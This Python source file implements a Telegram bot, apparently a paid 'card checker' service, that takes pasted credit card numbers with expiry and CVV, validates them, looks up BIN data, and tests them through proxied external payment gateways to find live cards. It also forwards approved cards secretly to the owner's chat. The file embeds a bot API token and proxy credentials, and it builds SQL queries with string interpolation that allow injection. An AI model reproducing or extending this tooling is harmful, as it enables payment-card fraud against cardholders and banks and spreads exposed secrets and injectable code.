
import logging
from os import dup
from random import random
from aiogram import Bot, Dispatcher, executor, types
import aiogram
from aiogram.utils import exceptions, executor
#from telegram import CallbackQuery
import ConnectDB
import json
import asyncio
import datetime
import re
import time
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import pytz
import calendar
import random
import aiogram as ErrorsAiogram
import aiohttp
from Translate import Translate
from urllib.parse import urlparse
API_TOKEN = '8505905087:AAFNlk5FBJOXMJfxxAlE2xwC5IMMOb7M6DE'
logging.basicConfig(level=logging.INFO)
#log = logging.getLogger('broadcast')

bot = Bot(token=API_TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)


async def CheckAccess(chatid, userid) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{chatid}'")
        result = json.loads(json.dumps(result))
        if result : return 1
        else :
            result =  await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{userid}'")
            result = json.loads(json.dumps(result))
            if result : return 1
            else : None
    except IndexError: None

async def AccessAdmin(UserID) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM staffalter WHERE ID='{UserID}'")
        result = json.loads(json.dumps(result[0]))
        Permission = result['PAdmin']
        if Permission == 'Yes' : return 'Access Permitted'
    except IndexError: None

async def AccessOwner(UserID) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM staffalter WHERE ID='{UserID}'")
        result = json.loads(json.dumps(result[0]))
        AlterID = result['ID']
        if int(AlterID) == 5673835413 : return 'Access Permitted'
    except IndexError: None

async def CheckAccessPrivate(userid) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{userid}'")
        result = json.loads(json.dumps(result))
        if result : return 1
        else : None
    except IndexError: None

async def AccessModerator(UserID) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM staffalter WHERE ID='{UserID}'")
        result = json.loads(json.dumps(result[0]))
        Permission = result['PModerator']
        if Permission == 'Yes' : return 'Access Permitted'
    except IndexError: None

async def Validator(cmd) :
    GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='{cmd}'")
    Gateway = json.loads(json.dumps(GatewaysSearch[0]))
    return Gateway

async def VerifyStatus(gate):
    GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='{gate}'")
    Gateway = json.loads(json.dumps(GatewaysSearch[0]))
    status_g = Gateway['Status']
    fecha_g = Gateway['DateOFF']
    comment_g = Gateway['Mensaje']
    return status_g, fecha_g, comment_g

async def VerifyBanned(UserID):
    GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserID}'")
    Gateway = json.loads(json.dumps(GatewaysSearch[0]))
    Banned = Gateway['UserBanned']
    return Banned

async def checkLuhn(cardNo):
    nSum = 0
    isSecond = False
    for i in range(len(cardNo) - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
        if (isSecond == True):
            d = d * 2
        nSum += d // 10
        nSum += d % 10
        isSecond = not isSecond
    if (nSum % 10 == 0): return True
    else: return False
        
async def CCheck(yourmessage) :
    try :
        matchcc = re.findall(r"\b[0-9]{15,16}\b", yourmessage)
        CCnum = matchcc[0]
        BinCheck = int(CCnum[0:1])
        if 3 <= int(BinCheck) <= 6 :
            if 15 <= len(CCnum) <= 16 :
                if 4 <= int(BinCheck) <= 6 :
                    mes = re.findall(r"\b(0[1-9]|1[0-2])\b", yourmessage)[0]
                    ano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-2])\b", yourmessage)[0]
                    cvv = re.findall(r"\b[0-9][0-9][0-9]\b", yourmessage)[0]

                elif int(BinCheck) == 3 :
                    mes = re.findall(r"\b(0?[1-9]|1[0-2])\b", yourmessage)[0]
                    ano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-2])\b", yourmessage)[0]
                    cvv = re.findall(r"\b[0-9][0-9][0-9][0-9]\b", yourmessage)[0]
        else : return None

        if await checkLuhn(CCnum) :
            IST = pytz.timezone('US/Central') 
            now = datetime.datetime.now(IST)
            if len(ano) == 2 : ano = f'20{ano}'
            if ((datetime.datetime.strptime(now.strftime("%m-%Y"), "%m-%Y") <= datetime.datetime.strptime(f'{mes}-{ano}', "%m-%Y"))) == False : return None
            
            return f"{CCnum}|{mes}|{ano}|{cvv}"
        else : None
    except IndexError: None


async def CCheckMASS(yourmessage):
    results = []
    for message in yourmessage.split("\n"):
        try:
            matchcc = re.findall(r"\b[0-9]{15,16}\b", message)
            CCnum = matchcc[0]
            BinCheck = int(CCnum[0:1])
            if 3 <= int(BinCheck) <= 6:
                if 15 <= len(CCnum) <= 16:
                    if 4 <= int(BinCheck) <= 6:
                        mes = re.findall(r"\b(0[1-9]|1[0-2])\b", message)[0]
                        ano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-2])\b", message)[0]
                        cvv = re.findall(r"\b[0-9][0-9][0-9]\b", message)[0]
                    elif int(BinCheck) == 3:
                        mes = re.findall(r"\b(0?[1-9]|1[0-2])\b", message)[0]
                        ano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-2])\b", message)[0]
                        cvv = re.findall(r"\b[0-9][0-9][0-9][0-9]\b", message)[0]
            else:
                continue

            if await checkLuhn(CCnum):
                IST = pytz.timezone('US/Central') 
                now = datetime.datetime.now(IST)
                if len(ano) == 2:
                    ano = f'20{ano}'
                if not (datetime.datetime.strptime(now.strftime("%m-%Y"), "%m-%Y") <= datetime.datetime.strptime(f'{mes}-{ano}', "%m-%Y")):
                    continue
                
                results.append(f"{CCnum}|{mes}|{ano}|{cvv}")
        except IndexError:
            continue
    return results

async def CheckProxy() :
    import aiohttp
    try:
        #randomnum = random.randint(1,75)
        Rotate = f"http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"
        session = aiohttp.ClientSession()
        async with session.get("https://ipv4.webshare.io/", proxy=str(Rotate), timeout=8) as resp:
            ResultP = await resp.text()
            if (ResultP) :
                await session.close()
                return "Live ✅", Rotate
            else:
                Tries = 0
                FinalTries = 0   
                while Tries < 3:
                    if not ResultP:
                        async with session.get("https://ipv4.webshare.io/", proxy=str(Rotate), timeout=15) as resp:
                            ResultP = await resp.text()
                            if not ResultP:
                                Tries+=1
                                FinalTries+=1
                                print(f"[Require Retrie] Tries: {Tries}")
                            else :
                                Tries+=3
                                FinalTries+=0
                    else :
                        Tries+=3
                        FinalTries = 0
                if int(FinalTries) >= 3 :
                    await session.close()
                    return None
                else :
                    print(f"Tries: {FinalTries}")
                    await session.close()
                    return "Live ✅", Rotate
    except TimeoutError:
        Tries = 0
        FinalTries = 0   
        while Tries < 3:
            try:
                async with session.get("https://ipv4.webshare.io/", proxy=str(Rotate), timeout=15) as resp:
                    ResultP = await resp.text()
                    if not ResultP:
                        Tries+=1
                        FinalTries+=1
                        print(f"[Require Retrie] Tries: {Tries}")
                    else :
                        Tries+=3
                        FinalTries+=0
                if int(FinalTries) >= 3 :
                    await session.close()
                    return None
                else :
                    print(f"Tries: {FinalTries}")
                    await session.close()
                    return "Live ✅", Rotate
            except TimeoutError:
                return None
            except:
                return None
    except :
        Tries = 0
        FinalTries = 0   
        while Tries < 3:
            try:
                async with session.get("https://ipv4.webshare.io/", proxy=str(Rotate), timeout=15) as resp:
                    ResultP = await resp.text()
                    if not ResultP:
                        Tries+=1
                        FinalTries+=1
                        print(f"[Require Retrie] Tries: {Tries}")
                    else :
                        Tries+=3
                        FinalTries+=0
                if int(FinalTries) >= 3 :
                    await session.close()
                    return None
                else :
                    print(f"Tries: {FinalTries}")
                    await session.close()
                    return "Live ✅", Rotate
            except TimeoutError:
                return None
            except:
                return None

async def CheckPRM(ChatType, FromUserID, FromChatID) :
    if str(ChatType) == 'private':
        CheckPremium = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{FromUserID}'")
        if len(CheckPremium) != 0 :
            IST = pytz.timezone('US/Central') 
            fecha_actual = datetime.datetime.now(IST).strftime(f"%d-%m-%Y %H:%M:%S")
            NextBilling =  json.loads(json.dumps(CheckPremium[0]))['NextBilling']
            if (datetime.datetime.strptime(fecha_actual, "%d-%m-%Y %H:%M:%S") > datetime.datetime.strptime(NextBilling, "%d-%m-%Y %H:%M:%S")) :
                await ConnectDB.run_query(f"UPDATE pruebas SET Status='Free User' , TimeAntiSpam='90' WHERE ID='{FromUserID}'")
                await ConnectDB.run_query(f"DELETE FROM userpremium WHERE ID='{FromChatID}'")
                await bot.ban_chat_member(chat_id=-1001857380843, user_id=FromUserID)
                await bot.unban_chat_member(chat_id=-1001857380843, user_id=FromUserID)
    else :
        CheckPremium = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{FromChatID}'")
        if len(CheckPremium) != 0 :
            IST = pytz.timezone('US/Central') 
            fecha_actual = datetime.datetime.now(IST).strftime(f"%d-%m-%Y %H:%M:%S")
            NextBilling =  json.loads(json.dumps(CheckPremium[0]))['NextBilling']
            if (datetime.datetime.strptime(fecha_actual, "%d-%m-%Y %H:%M:%S") > datetime.datetime.strptime(NextBilling, "%d-%m-%Y %H:%M:%S")) : await ConnectDB.run_query(f"DELETE FROM userpremium WHERE ID='{FromChatID}'")
        
        CheckPremiumTwo = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{FromUserID}'")
        if len(CheckPremiumTwo) != 0:
            IST = pytz.timezone('US/Central') 
            fecha_actual = datetime.datetime.now(IST).strftime(f"%d-%m-%Y %H:%M:%S")
            NextBilling =  json.loads(json.dumps(CheckPremiumTwo[0]))['NextBilling']

            if (datetime.datetime.strptime(fecha_actual, "%d-%m-%Y %H:%M:%S") > datetime.datetime.strptime(NextBilling, "%d-%m-%Y %H:%M:%S")) :
                await ConnectDB.run_query(f"UPDATE pruebas SET Status='Free User' , TimeAntiSpam='90' WHERE ID='{FromUserID}'")
                await ConnectDB.run_query(f"DELETE FROM userpremium WHERE ID='{FromUserID}'")
                await bot.ban_chat_member(chat_id=-1001857380843, user_id=FromUserID)
                await bot.unban_chat_member(chat_id=-1001857380843, user_id=FromUserID)

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["sb"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Syna [ 15$ ]'
    TwoNameGateway = 'Gateway ↯ Syna [ 15$ ]'
    ThreeGateway = 'Gateway 🔥 Syna [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('sb')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDsb import CMDsbCHK
        CheckRecive = await CMDsbCHK(CcVerify, CheckedP[1])

        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
            await bot.send_message(chat_id=5673835413, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["rr"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Ryuk [ 12$ ]'
    TwoNameGateway = 'Gateway ↯ Ryuk [ 12$ ]'
    ThreeGateway = 'Gateway 🔥 Ryuk [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('rr')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
